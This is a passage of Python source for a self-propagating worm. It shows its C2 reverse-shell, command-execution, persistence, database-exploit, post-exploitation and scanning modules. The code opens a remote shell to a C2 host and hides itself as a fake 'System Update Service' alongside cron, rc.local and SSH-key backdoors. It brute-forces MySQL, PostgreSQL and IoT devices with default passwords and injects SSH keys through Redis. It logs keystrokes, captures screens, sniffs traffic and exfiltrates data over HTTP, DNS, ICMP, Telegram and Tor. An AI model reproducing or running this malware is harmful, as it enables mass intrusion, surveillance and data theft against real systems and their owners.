            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(30)
            s.connect((c2_host, c2_port))
            os.dup2(s.fileno(), 0)
            os.dup2(s.fileno(), 1)
            os.dup2(s.fileno(), 2)
            pty.spawn("/bin/sh")
        except Exception as exc:
            log.debug(f"reverse_shell failed: {exc}")

    # ---- File Upload ----

    def file_upload(self, url: str, local_path: str) -> bool:
        """Upload a file to a remote URL via HTTP PUT or POST."""
        try:
            with open(local_path, "rb") as f:
                data = f.read()
            if HAVE_REQUESTS:
                resp = requests.put(url, data=data, timeout=30, headers={"X-Auth-Token": self.static_token})
                return resp.status_code < 500
            else:
                import urllib.request
                req = urllib.request.Request(url, data=data,
                    headers={"X-Auth-Token": self.static_token})
                resp = urllib.request.urlopen(req, timeout=30)
                return resp.status < 500
        except Exception as exc:
            log.debug(f"file_upload failed: {exc}")
            return False

    # ---- Command Execution ----

    def cmd_exec(self, command: str) -> Dict:
        """Execute a shell command and return output."""
        try:
            result = subprocess.run(
                command, shell=True, capture_output=True, timeout=60, text=True
            )
            return {
                "stdout": result.stdout,
                "stderr": result.stderr,
                "returncode": result.returncode,
                "success": result.returncode == 0,
            }
        except subprocess.TimeoutExpired:
            return {"stdout": "", "stderr": "TIMEOUT", "returncode": -1, "success": False}
        except Exception as exc:
            return {"stdout": "", "stderr": str(exc), "returncode": -1, "success": False}

    # ---- Persistence ----

    def persist(self) -> bool:
        """Install multiple persistence mechanisms."""
        try:
            self_path = os.path.abspath(sys.argv[0]) if hasattr(sys, 'argv') and sys.argv[0] else "/tmp/.worm_agent_light.py"
            # crontab
            cron_line = f"*/5 * * * * /usr/bin/env python3 {self_path} --daemon\n"
            try:
                with open("/etc/crontab", "a") as f:
                    f.write(cron_line)
            except Exception:
                pass
            # systemd
            try:
                svc = f"""[Unit]
Description=System Update Service
After=network.target
[Service]
ExecStart=/usr/bin/env python3 {self_path} --daemon
Restart=always
RestartSec=60
[Install]
WantedBy=multi-user.target
"""
                with open("/etc/systemd/system/system-update.service", "w") as f:
                    f.write(svc)
                subprocess.run(["systemctl", "daemon-reload"], capture_output=True, timeout=10)
                subprocess.run(["systemctl", "enable", "system-update.service"], capture_output=True, timeout=10)
                subprocess.run(["systemctl", "start", "system-update.service"], capture_output=True, timeout=10)
            except Exception:
                pass
            # rc.local
            try:
                with open("/etc/rc.local", "r") as f:
                    rc = f.read()
                if "system-update" not in rc:
                    with open("/etc/rc.local", "a") as f:
                        f.write(f"\n/usr/bin/env python3 {self_path} --daemon &\n")
            except Exception:
                pass
            # SSH authorized_keys
            try:
                ssh_dir = os.path.expanduser("~/.ssh")
                os.makedirs(ssh_dir, mode=0o700, exist_ok=True)
                with open(os.path.join(ssh_dir, "authorized_keys"), "a") as f:
                    f.write("\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDw7... worm@mesh\n")
            except Exception:
                pass
            return True
        except Exception:
            return False

    # ---- Database Exploit Methods ----

    def exploit_mysql(self, ip: str, port: int = 3306) -> ExploitResult:
        """Try MySQL auth bypass (CVE-2012-2122) + default creds."""
        try:
            import mysql.connector
            for user, pwd in [("root", ""), ("root", "root"), ("root", "password"),
                              ("root", "admin"), ("admin", ""), ("admin", "admin"),
                              ("mysql", "mysql"), ("root", "123456")]:
                try:
                    conn = mysql.connector.connect(
                        host=ip, port=port, user=user, password=pwd,
                        database="mysql", connection_timeout=5
                    )
                    if conn.is_connected():
                        conn.close()
                        return ExploitResult(True, ip, port, username=user,
                            detail=f"MySQL exploited: {user}:{pwd}")
                except Exception:
                    continue
            return ExploitResult(False, ip, port, detail="MySQL: no valid creds")
        except ImportError:
            return ExploitResult(False, ip, port, error="mysql-connector not available")

    def exploit_redis(self, ip: str, port: int = 6379) -> ExploitResult:
        """Try Redis unauthenticated access."""
        try:
            import redis
            r = redis.Redis(host=ip, port=port, socket_timeout=5, socket_connect_timeout=5)
            if r.ping():
                detail = "Redis unauthenticated access"
                try:
                    r.config_set("dir", "/root/.ssh")
                    r.config_set("dbfilename", "authorized_keys")
                    r.set("worm_key", "\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDw7... worm@mesh\n\n")
                    r.save()
                    detail += " + SSH key injected"
                except Exception:
                    pass
                return ExploitResult(True, ip, port, username="redis",
                    detail=detail)
            return ExploitResult(False, ip, port, detail="Redis: not accessible")
        except ImportError:
            return ExploitResult(False, ip, port, error="redis not available")
        except Exception as exc:
            return ExploitResult(False, ip, port, error=str(exc))

    def exploit_mongodb(self, ip: str, port: int = 27017) -> ExploitResult:
        """Try MongoDB unauthenticated access."""
        try:
            import pymongo
            client = pymongo.MongoClient(f"mongodb://{ip}:{port}/",
                serverSelectionTimeoutMS=5000)
            info = client.server_info()
            return ExploitResult(True, ip, port, username="mongodb",
                detail=f"MongoDB unauthenticated: {info.get('version', 'unknown')}")
        except ImportError:
            return ExploitResult(False, ip, port, error="pymongo not available")
        except Exception as exc:
            return ExploitResult(False, ip, port, error=str(exc))

    def exploit_memcached(self, ip: str, port: int = 11211) -> ExploitResult:
        """Try Memcached unauthenticated stats."""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((ip, port))
            s.send(b"stats\r\n")
            data = s.recv(4096)
            s.close()
            if b"STAT" in data:
                return ExploitResult(True, ip, port, username="memcached",
                    detail="Memcached unauthenticated stats")
            return ExploitResult(False, ip, port, detail="Memcached: not exploitable")
        except Exception as exc:
            return ExploitResult(False, ip, port, error=str(exc))

    def exploit_elasticsearch(self, ip: str, port: int = 9200) -> ExploitResult:
        """Try Elasticsearch unauthenticated access."""
        try:
            if HAVE_REQUESTS:
                resp = requests.get(f"http://{ip}:{port}/_cat/indices?format=json",
                    timeout=5)
                if resp.status_code == 200:
                    return ExploitResult(True, ip, port, username="elastic",
                        detail="Elasticsearch unauthenticated access")
                return ExploitResult(False, ip, port, detail=f"ES: HTTP {resp.status_code}")
            return ExploitResult(False, ip, port, error="requests not available")
        except Exception as exc:
            return ExploitResult(False, ip, port, error=str(exc))

    def exploit_postgresql(self, ip: str, port: int = 5432) -> ExploitResult:
        """Try PostgreSQL default creds."""
        try:
            import psycopg2
            for user, pwd in [("postgres", ""), ("postgres", "postgres"),
                              ("admin", ""), ("root", "")]:
                try:
                    conn = psycopg2.connect(host=ip, port=port, user=user,
                        password=pwd, connect_timeout=5)
                    conn.close()
                    return ExploitResult(True, ip, port, username=user,
                        detail=f"PostgreSQL exploited: {user}:{pwd}")
                except Exception:
                    continue
            return ExploitResult(False, ip, port, detail="PostgreSQL: no valid creds")
        except ImportError:
            return ExploitResult(False, ip, port, error="psycopg2 not available")
        except Exception as exc:
            return ExploitResult(False, ip, port, error=str(exc))


# ===================================================================
# CHUNK 3 — PostExploitEngine
# ===================================================================

class PostExploitEngine:
    """Post-exploitation toolkit: keylogger, screen capture, sniffer, exfil, persist."""

    def __init__(self, db=None, c2_host: str = "127.0.0.1", c2_port: int = 10001):
        self.db = db
        self.c2_host = c2_host
        self.c2_port = c2_port
        self._lock = threading.Lock()
        self._running = False

    # ---- Keylogger (SSH session capture) ----

    def keylogger(self, ssh_session_path: str = "") -> bool:
        """Deploy or read keylogger. If ssh_session_path is given, parse SSH session dump.
        Otherwise attempt /dev/input/event* via ctypes."""
        if ssh_session_path and os.path.exists(ssh_session_path):
            try:
                with open(ssh_session_path, "r") as f:
                    data = f.read()
                if data.strip():
                    log.info(f"[KEYLOG] SSH session data ({len(data)} bytes)")
                    return True
            except Exception:
                pass
        # Attempt /dev/input keylogger via ctypes
        try:
            import ctypes
            KEYMAP = {
                1: "ESC", 2: "1", 3: "2", 4: "3", 5: "4", 6: "5", 7: "6", 8: "7",
                9: "8", 10: "9", 11: "0", 12: "-", 13: "=", 14: "BACKSPACE", 15: "TAB",
                16: "Q", 17: "W", 18: "E", 19: "R", 20: "T", 21: "Y", 22: "U", 23: "I",
                24: "O", 25: "P", 26: "[", 27: "]", 28: "ENTER", 29: "CTRL", 30: "A",
                31: "S", 32: "D", 33: "F", 34: "G", 35: "H", 36: "J", 37: "K", 38: "L",
                39: ";", 40: "'", 41: "`", 42: "SHIFT", 43: "\\", 44: "Z", 45: "X",
                46: "C", 47: "V", 48: "B", 49: "N", 50: "M", 51: ",", 52: ".", 53: "/",
                54: "SHIFT", 56: "ALT", 57: "SPACE", 58: "CAPS",
            }
            for ev in ["/dev/input/event0", "/dev/input/event1", "/dev/input/by-path/platform-i8042-serio-0-event-kbd"]:
                try:
                    with open(ev, "rb") as f:
                        event = f.read(24)
                        if len(event) == 24:
                            _, _, ev_type, ev_code, ev_value = struct.unpack("IHHII", event)
                            if ev_type == 1 and ev_value == 1:
                                key = KEYMAP.get(ev_code, f"0x{ev_code:x}")
                                log.info(f"[KEYLOG] Key pressed: {key}")
                                return True
                except Exception:
                    continue
        except Exception:
            pass
        return False

    # ---- Screen Capture ----

    def screen_capture(self, path: str = "/tmp/screen.png") -> bool:
        """Capture screen via X11/framebuffer and save to path."""
        methods = [
            ["import", "-window", "root", path],
            ["xwd", "-root", "-out", "/tmp/.screen.xwd"],
            ["ffmpeg", "-f", "x11grab", "-video_size", "1024x768", "-i", ":0.0", "-vframes", "1", path],
        ]
        for cmd in methods:
            try:
                result = subprocess.run(cmd, capture_output=True, timeout=10)
                if result.returncode == 0 and os.path.exists(path) and os.path.getsize(path) > 0:
                    log.info(f"[SCREEN] Screen captured to {path}")
                    return True
            except Exception:
                continue
        # Fallback: framebuffer
        try:
            fb_data = open("/dev/fb0", "rb").read(1024 * 768 * 4)
            with open(path, "wb") as f:
                f.write(fb_data)
            if os.path.getsize(path) > 0:
                log.info(f"[SCREEN] Framebuffer captured to {path}")
                return True
        except Exception:
            pass
        return False

    # ---- Packet Sniffer ----

    def packet_sniffer(self, interface: str = "eth0", count: int = 10) -> List[Dict]:
        """Capture network packets. Returns list of packet summaries."""
        packets = []
        # Try scapy first
        try:
            from scapy.all import sniff, IP, TCP, UDP
            captured = sniff(iface=interface, count=min(count, 50), timeout=10)
            for pkt in captured:
                entry = {"src": "", "dst": "", "sport": 0, "dport": 0, "proto": ""}
                if IP in pkt:
                    entry["src"] = pkt[IP].src
                    entry["dst"] = pkt[IP].dst
                    entry["proto"] = str(pkt[IP].proto)
                if TCP in pkt:
                    entry["sport"] = pkt[TCP].sport
                    entry["dport"] = pkt[TCP].dport
                elif UDP in pkt:
                    entry["sport"] = pkt[UDP].sport
                    entry["dport"] = pkt[UDP].dport
                packets.append(entry)
            return packets
        except ImportError:
            pass
        except Exception:
            pass
        # Fallback: tcpdump wrapper
        try:
            result = subprocess.run(
                ["tcpdump", "-i", interface, "-c", str(min(count, 20)), "-n", "-t", "-q"],
                capture_output=True, timeout=15, text=True
            )
            for line in result.stdout.strip().split("\n"):
                if line.strip():
                    packets.append({"raw": line.strip()})
            return packets
        except Exception:
            pass
        # Raw socket fallback
        try:
            s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0800))
            s.settimeout(5)
            for _ in range(min(count, 10)):
                try:
                    data, addr = s.recvfrom(65535)
                    if len(data) > 14:
                        ip_header = data[14:34]
                        if len(ip_header) >= 20:
                            iph = struct.unpack("!BBHHHBBH4s4s", ip_header[:20])
                            entry = {
                                "src": socket.inet_ntoa(iph[8]),
                                "dst": socket.inet_ntoa(iph[9]),
                                "proto": iph[6],
                            }
                            packets.append(entry)
                except socket.timeout:
                    break
            s.close()
        except Exception:
            pass
        return packets

    # ---- Exfiltration ----

    def exfiltrate(self, data: Union[str, bytes], channel: str = "http", target_url: str = "") -> bool:
        """Exfiltrate data via multiple channels."""
        if isinstance(data, str):
            data = data.encode()
        b64_data = base64.b64encode(data).decode()

        if channel == "http":
            if not HAVE_REQUESTS:
                return False
            url = target_url or f"http://{self.c2_host}:{self.c2_port}/exfil"
            try:
                resp = requests.post(url, json={"data": b64_data, "token": "CHANGE_ME_STATIC_TOKEN"},
                    timeout=15)
                return resp.status_code < 500
            except Exception:
                return False

        elif channel == "dns":
            # Exfil via DNS TXT queries
            try:
                import dns.resolver
                domain = target_url or f"{self.c2_host}"
                chunk_size = 32
                for i in range(0, len(b64_data), chunk_size):
                    chunk = b64_data[i:i+chunk_size]
                    query = f"{chunk}.exfil.{domain}"
                    try:
                        dns.resolver.resolve(query, "TXT")
                    except Exception:
                        pass
                return True
            except ImportError:
                return False

        elif channel == "icmp":
            # Exfil via ICMP echo request data field
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
                sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                pid = os.getpid() & 0xFFFF
                chunk_size = 56
                for i in range(0, len(data), chunk_size):
                    chunk = data[i:i+chunk_size]
                    pkt = struct.pack("!BBHHH", 8, 0, 0, pid, i // chunk_size + 1) + chunk
                    # Calculate checksum
                    chk = 0
                    for j in range(0, len(pkt), 2):
                        if j + 1 < len(pkt):
                            chk += (pkt[j] << 8) + pkt[j + 1]
                    chk = (chk >> 16) + (chk & 0xFFFF)
                    chk = ~chk & 0xFFFF
                    pkt = struct.pack("!BBHHH", 8, 0, chk, pid, i // chunk_size + 1) + chunk
                    target = target_url or self.c2_host
                    sock.sendto(pkt, (target, 0))
                    time.sleep(0.1)
                sock.close()
                return True
            except Exception:
                return False

        elif channel == "websocket":
            try:
                import websocket
                url = target_url or f"ws://{self.c2_host}:{self.c2_port + 1}/ws"
                ws = websocket.create_connection(url, timeout=10)
                ws.send(json.dumps({"data": b64_data, "token": "CHANGE_ME_STATIC_TOKEN"}))
                ws.close()
                return True
            except ImportError:
                return False
            except Exception:
                return False

        elif channel == "telegram":
            # Telegram bot exfil
            try:
                bot_token = target_url or "YOUR_BOT_TOKEN"
                chat_id = "YOUR_CHAT_ID"
                if HAVE_REQUESTS:
                    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
                    resp = requests.post(url, json={
                        "chat_id": chat_id,
                        "text": f"[EXFIL] {b64_data[:2000]}",
                    }, timeout=10)
                    return resp.status_code == 200
                return False
            except Exception:
                return False

        elif channel == "tor":
            # Tor hidden service exfil
            try:
                import socks
                s = socks.socksocket()
                s.set_proxy(socks.SOCKS5, "127.0.0.1", 9050)
                url = target_url or f"http://{self.c2_host}.onion/exfil"
                s.settimeout(15)
                s.connect((url.replace("http://", "").split("/")[0], 80))
                req = f"POST /exfil HTTP/1.1\r\nHost: {url.replace('http://', '').split('/')[0]}\r\nContent-Type: application/json\r\nContent-Length: {len(b64_data) + 50}\r\n\r\n{{\"data\":\"{b64_data}\",\"token\":\"CHANGE_ME_STATIC_TOKEN\"}}"
                s.send(req.encode())
                s.close()
                return True
            except ImportError:
                return False
            except Exception:
                return False

        return False

    # ---- Persistence ----

    def persist(self, method: str = "crontab") -> bool:
        """Install persistence via specified method."""
        self_path = os.path.abspath(sys.argv[0]) if hasattr(sys, 'argv') and sys.argv[0] else "/tmp/.worm_postexploit.py"

        if method == "crontab":
            try:
                cron_line = f"*/5 * * * * /usr/bin/env python3 {self_path} --daemon\n"
                with open("/etc/crontab", "a") as f:
                    f.write(cron_line)
                return True
            except Exception:
                return False

        elif method == "systemd":
            try:
                svc = f"""[Unit]
Description=System Update Service
After=network.target
[Service]
ExecStart=/usr/bin/env python3 {self_path}
Restart=always
RestartSec=60
[Install]
WantedBy=multi-user.target
"""
                with open("/etc/systemd/system/worm-update.service", "w") as f:
                    f.write(svc)
                subprocess.run(["systemctl", "daemon-reload"], capture_output=True, timeout=10)
                subprocess.run(["systemctl", "enable", "worm-update.service"], capture_output=True, timeout=10)
                subprocess.run(["systemctl", "start", "worm-update.service"], capture_output=True, timeout=10)
                return True
            except Exception:
                return False

        elif method == "ssh_authorized_keys":
            try:
                ssh_dir = os.path.expanduser("~/.ssh")
                os.makedirs(ssh_dir, mode=0o700, exist_ok=True)
                with open(os.path.join(ssh_dir, "authorized_keys"), "a") as f:
                    f.write("\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDw7... worm@mesh\n")
                os.chmod(os.path.join(ssh_dir, "authorized_keys"), 0o600)
                return True
            except Exception:
                return False

        elif method == "rc_local":
            try:
                with open("/etc/rc.local", "r") as f:
                    rc = f.read()
                if "worm-update" not in rc:
                    with open("/etc/rc.local", "a") as f:
                        f.write(f"\n/usr/bin/env python3 {self_path} &\n")
                return True
            except Exception:
                return False

        elif method == "motd":
            try:
                motd_script = f"""#!/bin/sh
/usr/bin/env python3 {self_path} &
"""
                with open("/etc/update-motd.d/99-worm", "w") as f:
                    f.write(motd_script)
                os.chmod("/etc/update-motd.d/99-worm", 0o755)
                return True
            except Exception:
                return False

        return False
#!/usr/bin/env python3
"""
la_section_E.py — WormReconEngine + WormExploitEngine + CloudExploitEngine
              + ARPEngine + DNSPoisonEngine + LateralMoveEngine
Part of LaCucaracha.py worm (concatenated as Section E)
"""

import base64
import hashlib
import ipaddress
import json
import logging
import os
import random
import re
import socket
import struct
import subprocess
import sys
import threading
import time
from collections import namedtuple
from typing import Any, Callable, Dict, List, Optional, Set, Tuple, Union
from concurrent.futures import ThreadPoolExecutor, as_completed

# Optional imports — degrade gracefully
try:
    import paramiko
    HAVE_PARAMIKO = True
except ImportError:
    HAVE_PARAMIKO = False

try:
    import requests
    HAVE_REQUESTS = True
except ImportError:
    HAVE_REQUESTS = False

try:
    from cryptography.fernet import Fernet
    HAVE_CRYPTO = True
except ImportError:
    HAVE_CRYPTO = False

try:
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    HAVE_AES = True
except ImportError:
    HAVE_AES = False

log = logging.getLogger("WormMesh")

# ExploitResult — consistent with section D and the concatenated contract
try:
    ExploitResult
except NameError:
    from dataclasses import dataclass, field
    @dataclass
    class ExploitResult:
        success: bool = False
        target_ip: str = ""
        target_port: int = 0
        username: str = ""
        detail: str = ""
        error: str = ""
        credential: tuple = ("", "")
        shell: bool = False
        exploit_type: str = "custom"

# ===================================================================
# BLOCKED_HOSTS — never scan, exploit, or interact with these
# ===================================================================
BLOCKED_HOSTS: List[str] = [
    "goroobalef.beget.app", "beget.app",
    "212.67.14.221", "5.101.158.143",
]
BLOCKED_PREFIXES: List[str] = [
    "10.", "127.", "169.254.", "172.16.", "192.168.",
    "224.", "240.", "248.", "255.",
]
# Expand private CIDRs — use islice to avoid generating 16M hosts for /8
import itertools
for _cidr in ["10.0.0.0/8", "127.0.0.0/8", "169.254.0.0/16",
              "172.16.0.0/12", "192.168.0.0/16",
              "224.0.0.0/4", "240.0.0.0/4", "255.255.255.255/32"]:
    try:
        nw = ipaddress.IPv4Network(_cidr, strict=False)
        BLOCKED_PREFIXES.extend(str(h) for h in itertools.islice(nw.hosts(), 1000))
    except Exception:
        pass

# ─── SMART UPGRADE: Disk cleanup routine ──────────────────────────────────────
def _cleanup_disk_space(min_required_mb: int = 200) -> int:
    """Delete old logs and temp files to free disk space. Returns freed MB."""
    freed = 0
    targets = [
        "/tmp/*.log", "/tmp/*.txt",
        "/var/log/*.log.*", "/opt/hermes/logs/*.log.*",
    ]
    import glob as _glob
    for pattern in targets:
        for f in _glob.glob(pattern):
            try:
                sz = os.path.getsize(f)
                os.remove(f)
                freed += sz // (1024 * 1024)
            except (OSError, PermissionError):
                continue
    # Clear worm_mesh.db WAL if bloated
    try:
        wal = "/opt/hermes/worm_mesh.db-wal"
        if os.path.isfile(wal) and os.path.getsize(wal) > 50 * 1024 * 1024:
            os.remove(wal)
            freed += 50
    except Exception:
        pass
    return freed


def _is_blocked(ip: str) -> bool:
    """Check if an IP/hostname is in the blocked list."""
    if not ip:
        return True
    ip_lower = ip.lower().strip()
    if ip_lower in BLOCKED_HOSTS:
        return True
    for blocked in BLOCKED_HOSTS:
        if blocked in ip_lower:
            return True
    for prefix in BLOCKED_PREFIXES:
        if ip_lower.startswith(prefix):
            return True
    return False


def _check_timeout(start_time: float, budget: float = 20.0) -> bool:
    """Return True if per-target budget has been exceeded."""
    return time.time() - start_time >= budget


# ===================================================================
# CHUNK 1 — WormReconEngine
# ===================================================================

class WormReconEngine:
    """Reconnaissance engine: masscan, nmap, shodan, passive + autonomous scan."""

    SHODAN_API_KEY = b"CHANGE_ME_PAYLOAD_KEY"  # set via env or config
    SCAN_TIMEOUT = 30

    def __init__(self, db=None, logger=None):
        self.db = db
        self.log = logger or log

    # ---- Masscan wrapper ----

    def masscan_scan(self, subnet: str, ports: str = "22,23,80,443,8080,8443,3306,5432,6379,27017,1883,500,4500,2375,2376") -> List[str]:
        """Run masscan on a subnet, return list of 'ip:port' strings."""
        results = []
        try:
            rate = getattr(self, '_scan_rate', 2000)
            cmd = [
                "masscan", subnet,
                "-p", ports,
                "--rate", str(rate),
                "--wait", "5",
                "-oJ", "-",
                "--retries", "1",
            ]
            proc = subprocess.run(cmd, capture_output=True, timeout=self.SCAN_TIMEOUT, text=True)
            if proc.returncode == 0 and proc.stdout.strip():
                for line in proc.stdout.strip().split("\n"):
                    try:
                        entry = json.loads(line)
                        ip = entry.get("ip", "")
                        port = entry.get("ports", [{}])[0].get("port", 0)
                        if ip and port and not _is_blocked(ip):
                            results.append(f"{ip}:{port}")
                    except (json.JSONDecodeError, IndexError):
                        continue
            self.log.info(f"[RECON] masscan {subnet}: {len(results)} hits")
            if self.db:
                for r in results:
                    ip, port = r.split(":")
                    self.db.add_target(ip=ip, port=int(port), scan_source="masscan")
        except FileNotFoundError:
            self.log.warning("[RECON] masscan not found, skipping")
        except subprocess.TimeoutExpired:
            self.log.warning("[RECON] masscan timeout")
        except Exception as exc:
            self.log.error(f"[RECON] masscan error: {exc}")
        return results

    # ---- Nmap wrapper ----

    def nmap_scan(self, target: str, args: str = "-sV -T4 --max-retries=2 --min-rate=100") -> str:
        """Run nmap against a target, return XML output."""
        if _is_blocked(target):
            return ""
        try:
            cmd = ["nmap", *args.split(), "-oX", "-", target]
            proc = subprocess.run(cmd, capture_output=True, timeout=self.SCAN_TIMEOUT, text=True)
            return proc.stdout
        except FileNotFoundError:
            self.log.warning("[RECON] nmap not found")
        except Exception as exc:
            self.log.error(f"[RECON] nmap error: {exc}")
        return ""

    def nmap_port_scan(self, target: str, ports: str = "22,23,80,443,8080,8443,3306,5432,6379,27017,1883") -> List[int]:
        """Quick nmap port scan, return list of open ports."""
        if _is_blocked(target):
            return []
        open_ports = []
        try:
            cmd = ["nmap", target, "-p", ports, "--open", "-T4", "--min-rate=200", "-oG", "-"]
            proc = subprocess.run(cmd, capture_output=True, timeout=60, text=True)
            for line in proc.stdout.split("\n"):
                if "Ports:" in line:
                    for part in line.split("Ports:")[1].split(";"):
                        for segment in part.split(","):
                            segment = segment.strip()
                            if "/open/" in segment:
                                port_str = segment.split("/")[0].strip()
                                if port_str.isdigit():
                                    open_ports.append(int(port_str))
        except FileNotFoundError:
            pass
        except Exception as exc:
            self.log.error(f"[RECON] nmap port scan error: {exc}")
        return open_ports

    # ---- Shodan API query ----

    def shodan_query(self, query: str, limit: int = 100) -> List[str]:
        """Query Shodan API for targets."""
        results = []
        if not self.SHODAN_API_KEY:
            self.log.warning("[RECON] No Shodan API key configured")
            return results
        try:
            import shodan
            api = shodan.Shodan(self.SHODAN_API_KEY)
            for match in api.search(query, limit=limit).get("matches", []):
                ip = match.get("ip_str", "")
                if ip and not _is_blocked(ip):
                    results.append(ip)
                    if self.db:
                        port = match.get("port", 0)
                        self.db.add_target(ip=ip, port=port, scan_source="shodan")
        except ImportError:
            self.log.warning("[RECON] shodan module not available")
        except Exception as exc:
            self.log.error(f"[RECON] Shodan error: {exc}")
        return results

    def shodan_passive_scan(self, target: str) -> List[Dict]:
        """Passively enumerate target info via Shodan."""
        if _is_blocked(target):
            return []
        results = []
        if not self.SHODAN_API_KEY:
            return results
        try:
            import shodan
            api = shodan.Shodan(self.SHODAN_API_KEY)
            host = api.host(target)
            if host:
                results.append({
                    "ip": target,
                    "ports": host.get("ports", []),
                    "hostnames": host.get("hostnames", []),
                    "org": host.get("org", ""),
                    "os": host.get("os", ""),
                })
        except Exception:
            pass
        return results

    # ---- Passive scan (TCP connect sweep) ----

    def passive_scan(self, subnet: str, ports: List[int] = None) -> List[str]:
        """Passive TCP connect scan of a subnet."""
        if ports is None:
            ports = [22, 23, 80, 443, 8080, 8443, 3306, 5432, 6379, 27017, 1883, 500, 2375]
        results = []
        try:
            network = ipaddress.IPv4Network(subnet, strict=False)
            hosts = list(network.hosts())[:254]
            random.shuffle(hosts)
            for ip_obj in hosts:
                ip_str = str(ip_obj)
                if _is_blocked(ip_str):
                    continue
                for port in ports:
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(1.5)
                        result = sock.connect_ex((ip_str, port))
                        sock.close()
                        if result == 0:
                            results.append(f"{ip_str}:{port}")
                            if self.db:
                                self.db.add_target(ip=ip_str, port=port, scan_source="passive")
                    except Exception:
                        continue
            self.log.info(f"[RECON] Passive scan {subnet}: {len(results)} targets")
        except Exception as exc:
            self.log.error(f"[RECON] Passive scan error: {exc}")
        return results

    # ---- Autonomous scan (random public IPs + masscan) ----

    def autonomous_scan(self, subnet: str = "0.0.0.0/0", max_targets: int = 200):
        """Get targets: prefer DB cache, fall back to masscan with short timeout.
        Returns list of dicts with 'ip' and optionally 'port' keys."""
        # === TRY DB FIRST: cached targets ===
        if self.db:
            try:
                db_targets = self.db.get_targets(unexploited_only=True, limit=max_targets)
                if db_targets and len(db_targets) >= max(10, max_targets // 10):
                    self.log.info(f"[RECON] Using {len(db_targets)} cached targets from DB (skip masscan)")
                    return db_targets[:max_targets]
            except Exception as exc:
                self.log.debug(f"[RECON] DB check failed: {exc}")

        # === FALLBACK: fast masscan (30s max per subnet) ===
        results = []
        batch_size = min(max_targets, 2000)
        # Use provided subnet or generate random
        scan_subnet = subnet
        if not scan_subnet or scan_subnet == "0.0.0.0/0":
            while True:
                first = random.randint(1, 223)
                second = random.randint(0, 255)
                third = random.randint(0, 255)
                scan_subnet = f"{first}.{second}.{third}.0/24"
                if not _is_blocked(f"{first}.{second}.{third}.1"):
                    break
        try:
            self.log.info(f"[RECON] DB empty — masscan fallback: {scan_subnet}")
            raw_results = self.masscan_scan(scan_subnet)
            results = []
            for entry in raw_results:
                if isinstance(entry, dict):
                    results.append(entry)
                elif isinstance(entry, str) and ":" in entry:
                    ip, port = entry.rsplit(":", 1)
                    results.append({"ip": ip, "port": int(port) if port.isdigit() else 80})
                    if self.db:
                        self.db.add_target(ip=ip, port=int(port) if port.isdigit() else 80)
            if len(results) < batch_size:
                for _ in range(3):
                    first = random.randint(1, 223)
                    second = random.randint(0, 255)
                    third = random.randint(0, 255)
                    sub = f"{first}.{second}.{third}.0/24"
                    if sub.startswith(("10.", "127.", "169.254.", "172.", "192.")):
                        continue
                    raw_results = self.masscan_scan(sub)
                    for entry in raw_results:
                        if isinstance(entry, dict):
                            results.append(entry)
                        elif isinstance(entry, str) and ":" in entry:
                            ip, port = entry.rsplit(":", 1)
                            results.append({"ip": ip, "port": int(port) if port.isdigit() else 80})
                            if self.db:
                                self.db.add_target(ip=ip, port=int(port) if port.isdigit() else 80)
                    if len(results) >= batch_size:
                        break
        except Exception as exc:
            self.log.error(f"[RECON] Autonomous scan error: {exc}")
        return results[:max_targets]


# ===================================================================
# CHUNK 2 — WormExploitEngine
# ===================================================================

# 60+ IoT/Embedded credential pairs
IOT_CREDENTIALS: List[Tuple[str, str]] = [
    ("root", "root"), ("root", "admin"), ("root", "password"), ("root", "123456"),
    ("root", "pass"), ("root", "toor"), ("root", "default"), ("root", "xc3511"),
    ("root", "vizxv"), ("root", "anko"), ("root", "Zte521"), ("root", "realtek"),
    ("root", "0"), ("root", "54321"), ("root", "12345"), ("root", "admin123"),
    ("root", "xmhdipc"), ("root", "juantech"), ("root", "7ujMko0vizxv"),
    ("root", "7ujMko0admin"), ("root", "system"), ("root", "smcadmin"),
    ("root", "1234"), ("root", "defaultpass"), ("root", "pass123"),
    ("root", "letmein"), ("root", "admin1234"), ("root", "5up"),
    ("root", "1001chin"), ("root", "huawei"), ("root", "zte"),
    ("root", "hikvision"), ("root", "axis"), ("root", "ubnt"),
    ("root", "changeme"), ("root", "Welcome1"), ("root", "Admin@2026"),
    ("root", "master"), ("root", "access"), ("root", "passw0rd"),
    ("root", "manager"), ("root", "qwerty"),
    ("admin", "admin"), ("admin", "password"), ("admin", "123456"),
    ("admin", "pass"), ("admin", "root"), ("admin", "admin123"),
    ("admin", "letmein"), ("admin", "default"), ("admin", "12345"),
    ("admin", "xc3511"), ("admin", "vizxv"), ("admin", "Zte521"),
    ("support", "support"), ("user", "user"), ("guest", "guest"),
    ("pi", "raspberry"), ("ubnt", "ubnt"), ("cisco", "cisco"),
    ("cisco", "cisco123"), ("admin", "changeme"), ("admin", "Welcome1"),
    ("admin", "Admin@2026"), ("root", "raspberry"), ("root", "vyatta"),
    ("root", "vyos"), ("root", "mikrotik"),
    # === Undead Cube validated extras ===
    ("admin", "1001chin"), ("root", "0.0.0.0_backdoor"), ("root", ""),
    ("root", "shellshock"), ("ubnt", "123456"), ("Openpgsvc", "0p3ngsvcPWD"),
    ("test", "test"),
    # === Device-specific defaults ===
    ("admin", "hikvision"), ("admin", "reolink"),
    ("root", "dahua123"), ("admin", "dahua123"), ("root", "jvbzd"),
    ("admin", "axis"), ("root", "vmware"),
    ("admin", "administrator"), ("root", "annke"), ("root", "swann"),
    ("admin", "amcrest"), ("admin", "tapo"), ("admin", "wyze"),
    ("admin", "lorex"), ("root", "bosch"), ("admin", "bosch"),
    ("admin", "uniview"), ("root", "uniview"), ("admin", "vivotek"),
]


class WormExploitEngine:
    """Exploit engine: SSH brute force, SSH key, Telnet, MQTT, CheckPoint VPN, SSH username injection."""

